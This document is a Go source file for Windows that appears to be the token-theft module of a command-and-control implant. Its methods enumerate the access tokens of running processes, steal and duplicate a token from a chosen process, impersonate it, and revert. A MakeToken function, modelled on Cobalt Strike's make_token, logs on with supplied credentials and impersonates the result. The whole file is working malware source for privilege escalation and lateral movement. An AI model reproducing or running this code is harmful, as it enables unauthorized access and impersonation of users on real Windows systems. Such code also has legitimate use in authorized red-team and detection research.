//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")
	modKernel32Token = windows.NewLazySystemDLL("kernel32.dll")

	procOpenProcessToken        = modAdvapi32.NewProc("OpenProcessToken")
	procDuplicateTokenEx        = modAdvapi32.NewProc("DuplicateTokenEx")
	procImpersonateLoggedOnUser = modAdvapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = modAdvapi32.NewProc("RevertToSelf")
	procLogonUserW              = modAdvapi32.NewProc("LogonUserW")
	procGetTokenInformation     = modAdvapi32.NewProc("GetTokenInformation")
	procLookupAccountSidW       = modAdvapi32.NewProc("LookupAccountSidW")
)

const (
	TOKEN_QUERY            = 0x0008
	TOKEN_DUPLICATE        = 0x0002
	TOKEN_IMPERSONATE      = 0x0004
	TOKEN_ASSIGN_PRIMARY   = 0x0001
	TOKEN_ALL_ACCESS       = 0xF01FF

	SecurityImpersonation  = 2
	TokenPrimary           = 1
	TokenImpersonation     = 2

	LOGON32_LOGON_NEW_CREDENTIALS = 9
	LOGON32_PROVIDER_DEFAULT      = 0

	TokenUser              = 1
	TokenIntegrityLevel    = 25
)

type TOKEN_USER struct {
	User windows.SIDAndAttributes
}

type TokenInfo struct {
	TokenID   string `json:"token_id"`
	PID       uint32 `json:"pid"`
	ProcessName string `json:"process_name"`
	Username  string `json:"username"`
	Domain    string `json:"domain"`
	IntegrityLevel string `json:"integrity_level,omitempty"`
}

// TokenManager manages stolen and impersonated tokens
type TokenManager struct {
	mu             sync.Mutex
	stolenTokens   map[string]windows.Handle
	currentToken   windows.Handle
	originalToken  windows.Handle
	nextTokenID    int
}

var tokenManager = &TokenManager{
	stolenTokens: make(map[string]windows.Handle),
}

// ListTokens enumerates tokens from running processes
func (i *Implant) ListTokens() ([]byte, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, fmt.Errorf("failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		return nil, fmt.Errorf("failed to enumerate processes: %v", err)
	}

	var tokens []TokenInfo

	for {
		pid := procEntry.ProcessID
		processName := windows.UTF16ToString(procEntry.ExeFile[:])

		// Try to open process and get token information
		if tokenInfo := getProcessTokenInfo(pid, processName); tokenInfo != nil {
			tokens = append(tokens, *tokenInfo)
		}

		if err := windows.Process32Next(snapshot, &procEntry); err != nil {
			break
		}
	}

	result := map[string]interface{}{
		"status": "success",
		"count":  len(tokens),
		"tokens": tokens,
	}

	return json.Marshal(result)
}

// getProcessTokenInfo retrieves token information for a process
func getProcessTokenInfo(pid uint32, processName string) *TokenInfo {
	// Skip system idle process
	if pid == 0 {
		return nil
	}

	// Open process
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return nil
	}
	defer windows.CloseHandle(hProcess)

	// Open process token
	var hToken windows.Handle
	ret, _, _ := procOpenProcessToken.Call(
		uintptr(hProcess),
		uintptr(TOKEN_QUERY|TOKEN_DUPLICATE),
		uintptr(unsafe.Pointer(&hToken)),
	)

	if ret == 0 {
		return nil
	}
	defer windows.CloseHandle(hToken)

	// Get token user
	username, domain := getTokenUser(hToken)
	if username == "" {
		return nil
	}

	// Get integrity level
	integrityLevel := getTokenIntegrityLevel(hToken)

	return &TokenInfo{
		TokenID:        fmt.Sprintf("token_%d", pid),
		PID:            pid,
		ProcessName:    processName,
		Username:       username,
		Domain:         domain,
		IntegrityLevel: integrityLevel,
	}
}

// getTokenUser retrieves username and domain from token
func getTokenUser(hToken windows.Handle) (string, string) {
	var tokenUser TOKEN_USER
	var returnLength uint32

	ret, _, _ := procGetTokenInformation.Call(
		uintptr(hToken),
		uintptr(TokenUser),
		uintptr(unsafe.Pointer(&tokenUser)),
		uintptr(unsafe.Sizeof(tokenUser)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret == 0 {
		return "", ""
	}

	// Lookup account SID
	var nameSize, domainSize uint32 = 256, 256
	name := make([]uint16, nameSize)
	domain := make([]uint16, domainSize)
	var sidType uint32

	ret, _, _ = procLookupAccountSidW.Call(
		0,
		uintptr(unsafe.Pointer(tokenUser.User.Sid)),
		uintptr(unsafe.Pointer(&name[0])),
		uintptr(unsafe.Pointer(&nameSize)),
		uintptr(unsafe.Pointer(&domain[0])),
		uintptr(unsafe.Pointer(&domainSize)),
		uintptr(unsafe.Pointer(&sidType)),
	)

	if ret == 0 {
		return "", ""
	}

	return syscall.UTF16ToString(name), syscall.UTF16ToString(domain)
}

// getTokenIntegrityLevel retrieves the integrity level of a token
func getTokenIntegrityLevel(hToken windows.Handle) string {
	var returnLength uint32

	// First call to get required buffer size
	procGetTokenInformation.Call(
		uintptr(hToken),
		uintptr(TokenIntegrityLevel),
		0,
		0,
		uintptr(unsafe.Pointer(&returnLength)),
	)

	// Allocate buffer
	buffer := make([]byte, returnLength)

	// Second call to get actual data
	ret, _, _ := procGetTokenInformation.Call(
		uintptr(hToken),
		uintptr(TokenIntegrityLevel),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(returnLength),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if ret == 0 {
		return "Unknown"
	}

	// Parse the TOKEN_MANDATORY_LABEL structure
	pLabel := (*windows.SIDAndAttributes)(unsafe.Pointer(&buffer[0]))

	// Get the integrity level SID sub-authority count
	subAuthorityCount := *(*uint8)(unsafe.Pointer(uintptr(unsafe.Pointer(pLabel.Sid)) + 1))

	if subAuthorityCount == 0 {
		return "Unknown"
	}

	// Get the RID (last sub-authority) which indicates the integrity level
	// Offset: SID structure (8 bytes for fixed parts) + (subAuthorityCount-1) * 4 bytes
	ridOffset := uintptr(8) + uintptr(subAuthorityCount-1)*4
	rid := *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(pLabel.Sid)) + ridOffset))

	// Map RID to integrity level name
	// Reference: https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
	switch {
	case rid >= 0x0000 && rid < 0x1000:
		return "Untrusted"
	case rid >= 0x1000 && rid < 0x2000:
		return "Low"
	case rid >= 0x2000 && rid < 0x3000:
		return "Medium"
	case rid >= 0x3000 && rid < 0x4000:
		return "High"
	case rid >= 0x4000:
		return "System"
	default:
		return "Unknown"
	}
}

// StealToken steals a token from a target process
func (i *Implant) StealToken(pid uint32) ([]byte, error) {
	tokenManager.mu.Lock()
	defer tokenManager.mu.Unlock()

	// Open target process
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Open process token
	var hToken windows.Handle
	ret, _, _ := procOpenProcessToken.Call(
		uintptr(hProcess),
		uintptr(TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_IMPERSONATE),
		uintptr(unsafe.Pointer(&hToken)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("failed to open process token for PID %d", pid)
	}
	defer windows.CloseHandle(hToken)

	// Duplicate token
	var hDuplicateToken windows.Handle
	ret, _, _ = procDuplicateTokenEx.Call(
		uintptr(hToken),
		uintptr(TOKEN_ALL_ACCESS),
		0,
		uintptr(SecurityImpersonation),
		uintptr(TokenImpersonation),
		uintptr(unsafe.Pointer(&hDuplicateToken)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("failed to duplicate token for PID %d", pid)
	}

	// Generate token ID
	tokenID := fmt.Sprintf("token_%d_%d", pid, tokenManager.nextTokenID)
	tokenManager.nextTokenID++

	// Store token
	tokenManager.stolenTokens[tokenID] = hDuplicateToken

	// Get token information
	username, domain := getTokenUser(hDuplicateToken)

	result := map[string]interface{}{
		"status":   "success",
		"token_id": tokenID,
		"pid":      pid,
		"username": username,
		"domain":   domain,
		"message":  fmt.Sprintf("Successfully stole token from PID %d (%s\\%s)", pid, domain, username),
	}

	return json.Marshal(result)
}

// ImpersonateToken impersonates a previously stolen token
func (i *Implant) ImpersonateToken(tokenID string) ([]byte, error) {
	tokenManager.mu.Lock()
	defer tokenManager.mu.Unlock()

	// Get stolen token
	hToken, exists := tokenManager.stolenTokens[tokenID]
	if !exists {
		return nil, fmt.Errorf("token not found: %s", tokenID)
	}

	// Save original token if not already saved
	if tokenManager.originalToken == 0 {
		var hCurrentToken windows.Token
		err := windows.OpenThreadToken(windows.CurrentThread(), TOKEN_ALL_ACCESS, true, &hCurrentToken)
		if err != nil {
			// No thread token, try process token
			hCurrentProcess := windows.CurrentProcess()
			ret, _, _ := procOpenProcessToken.Call(
				uintptr(hCurrentProcess),
				uintptr(TOKEN_ALL_ACCESS),
				uintptr(unsafe.Pointer(&hCurrentToken)),
			)
			if ret == 0 {
				return nil, fmt.Errorf("failed to get original token")
			}
		}
		tokenManager.originalToken = windows.Handle(hCurrentToken)
	}

	// Impersonate token
	ret, _, _ := procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if ret == 0 {
		return nil, fmt.Errorf("failed to impersonate token %s", tokenID)
	}

	tokenManager.currentToken = hToken

	username, domain := getTokenUser(hToken)

	result := map[string]interface{}{
		"status":   "success",
		"token_id": tokenID,
		"username": username,
		"domain":   domain,
		"message":  fmt.Sprintf("Successfully impersonating %s\\%s", domain, username),
	}

	return json.Marshal(result)
}

// RevertToken reverts to the original token
func (i *Implant) RevertToken() ([]byte, error) {
	tokenManager.mu.Lock()
	defer tokenManager.mu.Unlock()

	// Revert to self
	ret, _, _ := procRevertToSelf.Call()
	if ret == 0 {
		return nil, fmt.Errorf("failed to revert to self")
	}

	tokenManager.currentToken = 0

	result := map[string]interface{}{
		"status":  "success",
		"message": "Successfully reverted to original token",
	}

	return json.Marshal(result)
}

// MakeToken creates a new token using credentials (similar to Cobalt Strike's make_token)
func (i *Implant) MakeToken(domain, username, password string) ([]byte, error) {
	tokenManager.mu.Lock()
	defer tokenManager.mu.Unlock()

	var hToken windows.Handle

	// Convert strings to UTF16
	domainPtr, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return nil, err
	}
	usernamePtr, err := syscall.UTF16PtrFromString(username)
	if err != nil {
		return nil, err
	}
	passwordPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return nil, err
	}

	// Logon user with credentials
	ret, _, _ := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
		uintptr(LOGON32_PROVIDER_DEFAULT),
		uintptr(unsafe.Pointer(&hToken)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("failed to create token with provided credentials")
	}

	// Save original token if not already saved
	if tokenManager.originalToken == 0 {
		var hCurrentToken windows.Handle
		hCurrentProcess := windows.CurrentProcess()
		procOpenProcessToken.Call(
			uintptr(hCurrentProcess),
			uintptr(TOKEN_ALL_ACCESS),
			uintptr(unsafe.Pointer(&hCurrentToken)),
		)
		tokenManager.originalToken = hCurrentToken
	}

	// Impersonate the new token
	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(hToken))
	if ret == 0 {
		windows.CloseHandle(hToken)
		return nil, fmt.Errorf("failed to impersonate created token")
	}

	// Store token
	tokenID := fmt.Sprintf("made_token_%d", tokenManager.nextTokenID)
	tokenManager.nextTokenID++
	tokenManager.stolenTokens[tokenID] = hToken
	tokenManager.currentToken = hToken

	result := map[string]interface{}{
		"status":   "success",
		"token_id": tokenID,
		"username": username,
		"domain":   domain,
		"message":  fmt.Sprintf("Successfully created and impersonating token for %s\\%s", domain, username),
	}

	return json.Marshal(result)
}
